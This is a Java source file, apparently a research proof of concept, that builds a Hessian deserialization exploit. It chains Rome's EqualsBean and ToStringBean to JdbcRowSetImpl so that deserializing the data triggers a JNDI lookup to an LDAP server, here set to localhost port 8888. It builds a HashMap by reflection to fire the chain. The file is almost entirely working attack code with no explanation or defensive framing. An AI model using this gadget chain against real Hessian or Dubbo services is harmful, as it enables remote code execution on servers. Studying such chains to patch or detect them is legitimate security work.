package org.n1es.vuln.hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

import static org.apache.dubbo.common.utils.FieldUtils.setFieldValue;

public class HessianDeserialization {

	public static void main(String[] args) throws Exception {
		Object deserialize = deserialize(serialize(getPayload()));
		System.out.println(deserialize);
	}

	public static byte[] serialize(Object obj) {
		ByteArrayOutputStream out    = new ByteArrayOutputStream();
		Hessian2Output        output = new Hessian2Output(out);
		try {
			output.writeObject(obj);
			output.flush();
			return out.toByteArray();
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}

	public static Object deserialize(byte[] bytes) {
		ByteArrayInputStream in    = new ByteArrayInputStream(bytes);
		Hessian2Input        input = new Hessian2Input(in);
		try {
			return input.readObject();
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}

	public static Object getPayload() throws Exception {
		String         url = "ldap://127.0.0.1:8888";
		JdbcRowSetImpl rs  = new JdbcRowSetImpl();
		rs.setDataSourceName(url);
		rs.setMatchColumn("foo");

		ToStringBean tb   = new ToStringBean(JdbcRowSetImpl.class, rs);
		EqualsBean   root = new EqualsBean(ToStringBean.class, tb);

		HashMap<Object, Object> map = new HashMap();
		setFieldValue(map, "size", 2);

		Class<?> nodeC;
		try {
			nodeC = Class.forName("java.util.HashMap$Node");
		} catch (ClassNotFoundException e) {
			nodeC = Class.forName("java.util.HashMap$Entry");
		}

		Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
		nodeCons.setAccessible(true);

		Object tbl = Array.newInstance(nodeC, 2);
		Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
		Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
		setFieldValue(map, "table", tbl);


		return map;
	}
}
